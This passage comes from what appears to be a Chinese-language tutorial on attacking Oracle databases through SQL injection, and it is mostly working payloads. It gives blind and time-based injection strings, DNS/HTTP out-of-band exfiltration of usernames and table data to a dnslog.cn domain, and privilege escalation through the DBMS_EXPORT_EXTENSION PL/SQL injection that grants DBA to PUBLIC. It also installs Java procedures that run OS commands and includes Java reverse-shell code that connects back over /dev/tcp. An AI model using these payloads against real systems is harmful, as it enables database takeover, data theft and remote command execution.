<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select ascii(substr(user,1,1))from dual)&gt;65 --+</span><br></pre></td></tr></table></figure>

<p>payload构造如上。</p>
<h2 id="时间型盲注"><a href="#时间型盲注" class="headerlink" title="时间型盲注"></a>时间型盲注</h2><p>oracle注入中可以通过页面响应的状态，这里指的是响应时间，通过这种方式判断SQL是否被执行的方式，便是时间盲注。</p>
<p>oracle的时间盲注通常使用<code>DBMS_PIPE.RECEIVE_MESSAGE()</code>，而另外一种便是<code>decode()</code>与高耗时SQL操作的组合，当然也可以是case，if 等方式与高耗时操作的组合，这里的高耗时操作指的是，例如：<code>(select count(*) from all_objects)</code>，对数据库中大量数据进行查询或其他处理的操作，这样的操作会耗费较多的时间，然后通过这个方式来获取数据。这种方式也适用于其他数据库。</p>
<h3 id="dbms-pipe-receive-message-函数时间盲注"><a href="#dbms-pipe-receive-message-函数时间盲注" class="headerlink" title="dbms_pipe.receive_message()函数时间盲注"></a>dbms_pipe.receive_message()函数时间盲注</h3><p><code>DBMS_LOCK.SLEEP()</code>函数可以让一个过程休眠很多秒，但使用该函数存在许多限制。</p>
<p>首先，不能直接将该函数注入子查询中，因为Oracle不支持堆叠查询(stacked query)。其次，只有数据库管理员才能使用<code>DBMS_LOCK</code>包。</p>
<p>在Oracle PL/SQL中有一种更好的办法，可以使用下面的指令以内联方式注入延迟：</p>
<p><code>dbms_pipe.receive_message(&#39;RDS&#39;, 10)</code></p>
<p><code>DBMS_PIPE.RECEIVE_MESSAGE()</code>函数将为从RDS管道返回的数据等待10秒。默认情况下，允许以<code>public</code>权限执行该包。<code>DBMS_LOCK.SLEEP()</code>与之相反，它是一个可以用在SQL语句中的函数。</p>
<p><strong>查看是否可以使用dbms_pipe.receive_message()函数进行延时注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(dbms_pipe.receive_message(&#x27;RDS&#x27;,5)) --+</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061056362.png" alt="c73218c0384317c32b1796c080b43cad.png"></p>
<p>来自官网的DBMS_PIPE.RECEIVE_MESSAGE语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DBMS_PIPE.RECEIVE_MESSAGE (</span><br><span class="line">   pipename     IN VARCHAR2,</span><br><span class="line">   timeout      IN INTEGER      DEFAULT maxwait)</span><br><span class="line">RETURN INTEGER;</span><br></pre></td></tr></table></figure>

<p><strong>具体payload构造：</strong></p>
<p><strong>猜解当前用户</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 7238=(case when (ascii(substrc((select nvl(cast(user as varchar(4000)),chr(32)) from dual),1,1)) &gt; 65) then dbms_pipe.receive_message(chr(32)%7c%7cchr(106)%7c%7cchr(72)%7c%7cchr(73),5) else 7238 end) --+</span><br></pre></td></tr></table></figure>

<p><strong>猜解表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 7238=(case when (ascii(substrc((select nvl(cast(table_name as varchar(4000)),chr(32)) from all_tables where rownum=1 and owner=&#x27;TEST&#x27;),1,1)) &gt; 65) then dbms_pipe.receive_message(chr(32)%7c%7cchr(106)%7c%7cchr(72)%7c%7cchr(73),5) else 7238 end) --+</span><br></pre></td></tr></table></figure>

<p><strong>猜解字段</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 7238=(case when (ascii(substrc((select nvl(cast(column_name as varchar(4000)),chr(32)) from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1),1,1)) &gt; 65) then dbms_pipe.receive_message(chr(32)%7c%7cchr(106)%7c%7cchr(72)%7c%7cchr(73),5) else 7238 end) --+</span><br></pre></td></tr></table></figure>

<p><strong>猜解数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 7238=(case when (ascii(substrc((select nvl(cast(username as varchar(4000)),chr(32)) from test.users where rownum=1),1,1)) &gt; 65) then dbms_pipe.receive_message(chr(32)%7c%7cchr(106)%7c%7cchr(72)%7c%7cchr(73),5) else 7238 end) --+</span><br></pre></td></tr></table></figure>

<h3 id="decode-函数时间盲注"><a href="#decode-函数时间盲注" class="headerlink" title="decode()函数时间盲注"></a>decode()函数时间盲注</h3><p><code>（select count(*) from all_objects)</code>会花费更多时间去查询所有数据库的条目。不过在使用的过程中有很多不尽如人意的地方，有时候加载快有时加载慢。</p>
<p><strong>时间盲注的应用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,(select count(*) from all_objects),0) from dual)</span><br></pre></td></tr></table></figure>

<p>payload构造如上。</p>
<h3 id="decode-与dbms-pipe-receive-message-嵌套时间盲注"><a href="#decode-与dbms-pipe-receive-message-嵌套时间盲注" class="headerlink" title="decode()与dbms_pipe.receive_message()嵌套时间盲注"></a>decode()与dbms_pipe.receive_message()嵌套时间盲注</h3><p><strong>时间盲注的应用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,dbms_pipe.receive_message(&#x27;RDS&#x27;, 5),0) from dual)</span><br></pre></td></tr></table></figure>

<p>payload构造如上。</p>
<h2 id="DNS带外通信注入"><a href="#DNS带外通信注入" class="headerlink" title="DNS带外通信注入"></a>DNS带外通信注入</h2><p>Oracle注入之带外通信和DNSLOG注入非常相似，例如和mysql中load_file()函数实现无回显注入非常相似。</p>
<p>Oracle发送HTTP和DNS请求，并将查询结果带到请求中，然后检测外网服务器的HTTP和DNS日志，从日志中获取查询结果，通过这种方式将繁琐的盲注转换成可以直接获取查询结果的方式。</p>
<p>使用第三方平台，监听访问请求，并记录请求的日志信息，然后使用<code>utl_http.request()</code>向外网主机发送http请求，请求便携带了查询的结果信息。此处可以结合SSRF进行内网探测。或许这就是Oracle的SSRF。</p>
<p>利用<code>utl.inaddr.get_host_address()</code>，将查询结果拼接到域名下，并使用DNS记录解析日志，通过这种方式获取查询结果。</p>
<h3 id="检测是否支持utl-http-request"><a href="#检测是否支持utl-http-request" class="headerlink" title="检测是否支持utl_http.request"></a>检测是否支持utl_http.request</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and exists (select count(*) from all_objects where object_name=&#x27;UTL_HTTP&#x27;) --+</span><br></pre></td></tr></table></figure>

<p>若页面返回正常，这说明支持utl_http.request</p>
<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and utl_http.request(&#x27;http://&#x27;%7c%7c(select user from dual)%7c%7c&#x27;.z9mt3s.dnslog.cn/oracle&#x27;)=1--+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and utl_http.request(&#x27;http://&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;.z9mt3s.dnslog.cn/oracle&#x27;)=1--+</span><br><span class="line"></span><br><span class="line">获取列名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and utl_http.request(&#x27;http://&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;.z9mt3s.dnslog.cn/oracle&#x27;)=1--+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and utl_http.request(&#x27;http://&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;.z9mt3s.dnslog.cn/oracle&#x27;)=1--+</span><br></pre></td></tr></table></figure>

<h2 id="利用漏洞提权执行命令"><a href="#利用漏洞提权执行命令" class="headerlink" title="利用漏洞提权执行命令"></a>利用漏洞提权执行命令</h2><p>Oracle提权漏洞集中存在于PL/SQL编写的函数、存储过程、包、触发器中。Oracle存在提权漏洞的一个重要原因是PL/SQL定义的两种调用权限导致（定义者权限和调用者权限）。定义者权限给了低权限用户在特定时期拥有高权限的可能，这就给提权操作奠定了基础。</p>
<p>即，无论调用者权限如何，执行存储过程的结果权限永远为定义者权限，因此，如果一个较高权限的用户定义了存储过程，并赋予了低权限用户调用权限，较低权限的用户即可利用这个存储过程提权。</p>
<p>Java作为Oracle公司的主打语言，具有内置的安全性机制和高效的垃圾收集系统。Java还具有一组非常大的、丰富的标准库，从而可以更快、更低成本地开发应用程序。因此Oracle公司在它的Oracle数据库中，同样支持了使用Java来编写存储过程。</p>
<p>那么对于攻击者来说，完全可以通过这一特性，在系统上执行Java代码，从而完成提权操作。</p>
<p><strong>攻击流程</strong>：</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061057610.png" alt="859e8d3edbce11899c6415bfac2e25ee.png"></p>
<p><strong>本文测试环境均为</strong>：</p>
<blockquote>
<p>CentOS Linux release 7.2.1511 (Core)</p>
<p>Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit Production</p>
</blockquote>
<p>执行方式很多种，这边只研究Oracle10g，并且本地实测成功的</p>
<ul>
<li><code>DBMS_EXPORT_EXTENSION()</code></li>
<li><code>dbms_xmlquery.newcontext()</code></li>
<li><code>DBMS_JAVA_TEST.FUNCALL()</code></li>
</ul>
<h3 id="dbms-export-extension"><a href="#dbms-export-extension" class="headerlink" title="dbms_export_extension()"></a>dbms_export_extension()</h3><blockquote>
<ul>
<li>影响版本：Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</li>
<li>权限：None</li>
<li>详情：这个软件包有许多易受PL/SQL注入攻击的函数。这些函数由SYS拥有，作为SYS执行并且可由PUBLIC执行。因此，如果SQL注入处于上述任何未修补的Oracle数据库版本中，那么攻击者可以调用该函数并直接执行SYS查询。</li>
</ul>
</blockquote>
<h4 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h4><p>该请求将导致查询”GRANT DBA TO PUBLIC”以SYS身份执行。 因为这个函数允许PL / SQL缺陷（PL / SQL注入）。一旦这个请求成功执行，PUBLIC获取DBA角色，从而提升当前user的特权</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;grant dba to public&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<h4 id="使用Java执行"><a href="#使用Java执行" class="headerlink" title="使用Java执行"></a>使用Java执行</h4><p><strong>创建Java库</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args)&#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;public static String readFile(String filename)&#123;try&#123;BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><strong>赋予Java权限</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;begin dbms_java.grant_permission(&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;PUBLIC&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;SYS:java.io.FilePermission&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;,&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&lt;&gt;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;execute&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;);end;&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><strong>创建函数</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;LinxUtil.runCMD(java.lang.String) return String&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;;&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><strong>赋予函数执行权限</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;grant all on LinxRunCMD to public&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><strong>执行系统命令</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sys.LinxRunCMD(<span class="string">&#x27;/bin/bash -c /usr/bin/whoami&#x27;</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061057322.png" alt="46a99a5f54c8a8cbadca2549dd53d9fe.png"></p>
<h3 id="dbms-xmlquery-newcontext"><a href="#dbms-xmlquery-newcontext" class="headerlink" title="dbms_xmlquery.newcontext()"></a>dbms_xmlquery.newcontext()</h3><blockquote>
<ul>
<li>影响版本：Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</li>
<li>必须在DBMS_PORT_EXTENSION存在漏洞情况下，否则赋予权限时无法成功s</li>
</ul>
</blockquote>
<p><strong>创建Java库</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#x27;&#x27;;commit;end;&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>

<p><strong>赋予当前用户Java权限</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--当前用户查看</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;begin dbms_java.grant_permission(&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;YY&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;SYS:java.io.FilePermission&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;,&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;execute&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;);end;&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>

<p>通过以下命令可以查看all_objects内部改变：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name <span class="keyword">like</span> <span class="string">&#x27;%LINX%&#x27;</span> <span class="keyword">or</span> object_name <span class="keyword">like</span> <span class="string">&#x27;%Linx%&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061105963.png" alt="image-20211006110557755"></p>
<p><strong>创建函数</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &#x27;&#x27;&#x27;&#x27;LinxUtil.runCMD(java.lang.String) return String&#x27;&#x27;&#x27;&#x27;; &#x27;&#x27;;commit;end;&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>

<p>判断是否创建成功</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> OBJECT_ID <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name <span class="operator">=</span><span class="string">&#x27;LINXRUNCMD&#x27;</span></span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061106049.png" alt="image-20211006110629889" style="zoom:50%;">

<p>也可通过查看all_objects内部改变判断</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name <span class="keyword">like</span> <span class="string">&#x27;%LINX%&#x27;</span> <span class="keyword">or</span> object_name <span class="keyword">like</span> <span class="string">&#x27;%Linx%&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061107441.png" alt="image-20211006110714309"></p>
<p>若想删除创建的函数，通过以下命令删除</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> LinxRunCMD</span><br></pre></td></tr></table></figure>

<p><strong>执行命令</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> LinxRunCMD(<span class="string">&#x27;id&#x27;</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061059370.png" alt="2849daa3c5c2ade13eb918a3ca0ad502.png"></p>
<h3 id="dbms-java-test-funcall"><a href="#dbms-java-test-funcall" class="headerlink" title="dbms_java_test.funcall()"></a>dbms_java_test.funcall()</h3><blockquote>
<ul>
<li>影响版本： 10g R2, 11g R1, 11g R2</li>
<li>权限：Java Permissions</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> DBMS_JAVA_TEST.FUNCALL(<span class="string">&#x27;oracle/aurora/util/Wrapper&#x27;</span>,<span class="string">&#x27;main&#x27;</span>,<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;pwd &gt; /tmp/pwd.txt&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>

<p>执行时报如下错</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061108594.png" alt="5bf9bd61e8d2fa65abe45e7a3506eb08.png"></p>
<p>但不影响命令的执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061108224.png" alt="image-20211006110810998"></p>
<p>该方式无回显，在注入时不太方便利用，但可通过此方式反弹。</p>
<h2 id="Java反弹Shell"><a href="#Java反弹Shell" class="headerlink" title="Java反弹Shell"></a>Java反弹Shell</h2><p>在提权操作中如果遇到无回显情况，如上部分第三种方法，可以通过反弹shell的方式，在自己VPS上利用nc监听端口。以此来执行交互式执行命令（类似带外通信）。</p>
<h3 id="编译payload"><a href="#编译payload" class="headerlink" title="编译payload"></a>编译payload</h3><p>java源代码（linux系统的payload）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shellRev</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                System.out.println(<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">try</span>&#123;run();&#125;</span><br><span class="line">                <span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                String[] aaa=&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 9&lt;&gt; /dev/tcp/192.168.1.50/8080;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/sh&quot;</span>&#125;;</span><br><span class="line">                Process p=Runtime.getRuntime().exec(aaa);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#编译</span><br><span class="line">javac shellRev.java</span><br><span class="line">#执行</span><br><span class="line">java shellRev</span><br></pre></td></tr></table></figure>

<h3 id="使用Java执行-1"><a href="#使用Java执行-1" class="headerlink" title="使用Java执行"></a>使用Java执行</h3><p><strong>创建Java库</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;create or replace and compile java source named &quot;shell&quot; as import java.io.*;import java.net.*;public class shell &#123;public static void run() throws Exception&#123;String[] aaa=&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 9&lt;&gt; /dev/tcp/127.0.0.1/8080;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/sh&quot;&#125;;Process p=Runtime.getRuntime().exec(aaa);&#125;&#125;&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p><strong>赋予Java权限</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">&#x27;FOO&#x27;</span>,<span class="string">&#x27;BAR&#x27;</span>,<span class="string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;</span><span class="string">&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;begin dbms_java.grant_permission( &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;PUBLIC&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;SYS:java.net.SocketPermission&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&lt;&gt;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;*&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27; );end;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;;END;&#x27;</span><span class="string">&#x27;;END;--&#x27;</span>,<span class="string">&#x27;SYS&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0</span>) from 